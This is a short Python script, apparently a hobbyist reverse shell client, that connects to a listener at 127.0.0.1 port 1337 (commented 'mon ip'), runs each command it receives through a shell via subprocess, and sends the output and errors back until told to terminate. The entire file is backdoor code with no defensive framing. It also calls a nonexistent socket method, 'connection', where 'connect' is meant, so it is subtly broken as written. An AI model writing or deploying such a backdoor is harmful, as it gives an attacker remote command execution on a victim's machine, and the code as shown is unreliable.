import socket
import subprocess


def connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connection(('127.0.0.1', 1337)) #mon ip

    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break

        else:

            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read()) # send the result
            s.send(CMD.stderr.read()) # misstype a command error will be prompted back


def main():
    connection()

main()
